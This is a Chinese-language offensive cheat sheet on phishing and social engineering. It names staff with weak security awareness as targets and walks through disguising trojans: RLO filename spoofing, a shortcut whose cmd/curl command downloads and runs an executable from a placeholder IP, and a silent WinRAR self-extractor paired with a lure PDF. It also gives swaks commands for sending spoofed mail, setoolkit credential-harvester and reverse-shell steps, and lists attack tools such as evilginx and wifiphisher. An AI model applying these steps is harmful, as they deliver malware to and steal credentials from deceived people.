社会工程学
========================================

思路
----------------------------------------

基本流程
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 寻找大鱼
	目标一般包括：HR、销售、文员等安全意识比较薄弱的人员，以及运维、开发等掌握重要资源的人员。
+ 制作鱼饵
	一个高质量鱼饵一般分为两部分，一个是邮件内容更加的逼真可信，另一个是邮件的附件尽可能伪装的正常。
+ 抛竿
	最后把鱼竿抛出后就可以坐等鱼上钩了。

制作鱼饵
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ RLO文件伪装
	- 选择文件，F2重命名
	- 右键菜单，插入Unicode控制字符，选择RLO
	- 输入gnp后
	- 使用resourcehacker更换图片图标
+ 快捷方式
	- 生成木马exe文件
	- 创建快捷方式：``C:\Windows\System32\cmd.exe /k curl http://xxx.xxx.xxx.xxx/exe/artifact.exe --output C:\Windows\temp\win.exe && C:\Windows\temp\win.exe``
	- 更换一个系统图标
+ WinRAR
	- 生成木马MDE.exe,附件为 "美女大学生电话号码列表.pdf"
	- 选中2个文件，右键 "添加到压缩文件"
	- 点击创建自解压格式压缩文件
	- 点击高级"自解压选项"
		+ 常规:设置释放路径为"C:\windows\temp",勾选"绝对路径"
		+ 设置:解压后运行文件依次为"C:\windows\temp\MDE.exe","C:\windows\temp\美女大学生电话号码列表.pdf"
		+ 模式:全部隐藏
		+ 更新:勾选"解压并更新文件","覆盖所有文件"
		+ 文本和图标：选择合适的ico

邮件钓鱼
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 基础
	- SPF验证
		+ SPF是Sender Policy Framework 的缩写，SPF 记录实际上是服务器的一个 DNS 记录。
		+ 一种以IP地址认证电子邮件发件人身份的技术。接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面。
	- 检查SPF
		+ ``nslookup -type=txt qq.com``
	- SPF绕过
+ Swaks
	- 测试连通性：``swaks --to 123@qq.com``
	- 钓鱼邮件：``swaks --to 目标邮箱 -f xxx@163.com --data test.eml --server smtp.163.com -p 25 -au xxx@163.com -ap xxx邮箱密码``
+ Gophish
	-  项目地址：``https://github.com/gophish/gophish``
+ 缺点
	- 发出的邮件会显示由xxx@163.com代发
	- 可以由第三方平台代发：smtp2go，SendCloud

网站克隆
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ setoolkit
	- Spear-Phishing Attack Vectors【鱼叉式网络钓鱼攻击】
	- Website Attack Vectors【web网站式攻击-钓鱼(常用)】
		+ Java Applet Attack Method【java小程序攻击】
		+ Metasploit Browser Exploit Method【Metasploit浏览器利用】
		+ Credential Harvester Attack Method【凭证攻击(常用)】
			- Web Templates【web模板】
			- Site Cloner【克隆网站】
				默认IP，然后输入被克隆网站，登录记录就会被记录。
			- Custom Import【自定义导入】
		+ Tabnabbing Attack Method【Tabnabbing攻击】
		+ Web Jacking Attack Method【web劫持】
		+ Multi-Attack Web Method【web多重攻击】
		+ HTA Attack Method【HTA攻击】
			- Web Templates【web模板】
			- Site Cloner【克隆网站】
				输入克隆的站点，监听ip和端口默认就行，最后还需选择一个攻击载荷 Meterpreter Reverse TCP
			- Custom Import【自定义导入】
	- Infectious Media Generator【传染性木马】
	- Create a Payload and Listener【创建payload和监听器】
	- Mass Mailer Attack【邮件群发攻击】
	- Arduino-Based Attack Vector【基于安卓的攻击】
	- Wireless Access Point Attack Vector【wifi攻击】
	- QRCode Generator Attack Vector【生成二维码(就普通二维码)】
	- Powershell Attack Vectors【Powershell攻击】
	- Third Party Modules【第三方模块】
+ nginx反向代理克隆镜像网站
	- 原理：利用nginx反向代理克隆生成镜像网站就是通过反向代理将请求分发到一个不属于我们的网站去处理，最后将处理的结果再通过nginx返回给用户。

fake flash
----------------------------------------
- `Fake-flash <https://github.com/r00tSe7en/Fake-flash.cn>`_

OSINT
----------------------------------------
- `osint <http://osintframework.com/>`_
- `osint git <https://github.com/lockfale/OSINT-Framework>`_
- `OSINT-Collection <https://github.com/Ph055a/OSINT Collection>`_
- `trape <https://github.com/jofpin/trape>`_
- `Photon <https://github.com/s0md3v/Photon>`_
	+ 官方帮助:``https://github.com/s0md3v/Photon/wiki/Usage#dumping-dns-data``
	+ 基本用法:``python photon.py -u http://example.com``
	+ 克隆网站:``python photon.py -u "http://example.com" --clone``
	+ Depth of crawling:``-l or --level | Default: 2``
	+ Number of threads:``-t or --threads | Default: 2``
	+ Delay between each HTTP request:``-d or --delay | Default: 0``
	+ timeout:``--timeout | Default: 5``
	+ Cookies:``python photon.py -u "http://example.com" -c "PHPSESSID=u5423d78fqbaju9a0qke25ca87"``
	+ Specify output directory:``-o or --output | Default: domain name of target``
	+ Verbose output:``-v or --verbose``
	+ Exclude specific URLs:``python photon.py -u "http://example.com" --exclude="/blog/20[17|18]"``
	+ Specify seed URL(s):``python photon.py -u "http://example.com" --seeds "http://example.com/blog/2018,http://example.com/portals.html"``
	+ Specify user-agent(s):``python photon.py -u "http://example.com" --user-agent "curl/7.35.0,Wget/1.15 (linux-gnu)"``
	+ Custom regex pattern:``python photon.py -u "http://example.com" --regex "\d{10}"``
	+ Export formatted result:``python photon.py -u "http://example.com" --export=json``
	+ Use URLs from archive.org as seeds:``python photon.py -u "http://example.com" --wayback``
	+ Skip data extraction:``python photon.py -u "http://example.com" --only-urls``
	+ Update:``python photon.py --update``
	+ Extract secret keys:``python photon.py -u http://example.com --keys``
	+ Piping (Writing to stdout):``python photon.py -u http://example.com --stdout=custom | resolver.py``
	+ Ninja Mode:``--ninja``
	+ Dumping DNS data:``python photon.py -u http://example.com --dns``
- `pockint <https://github.com/netevert/pockint>`_

钓鱼
----------------------------------------
- `spoofcheck <https://github.com/BishopFox/spoofcheck>`_
- `gophish <https://github.com/gophish/gophish>`_
- `SocialFish <https://github.com/UndeadSec/SocialFish>`_
- `WiFiDuck <https://github.com/spacehuhn/WiFiDuck>`_ Bad USB

wifi
----------------------------------------
- `wifiphisher <https://github.com/wifiphisher/wifiphisher>`_
- `evilginx <https://github.com/kgretzky/evilginx>`_
- `mana <https://github.com/sensepost/mana>`_
- `pwnagotchi <https://github.com/evilsocket/pwnagotchi>`_

综合框架
----------------------------------------
- `theHarvester <https://github.com/laramies/theHarvester>`_
- `Th3inspector <https://github.com/Moham3dRiahi/Th3inspector>`_
- `ReconDog <https://github.com/s0md3v/ReconDog>`_
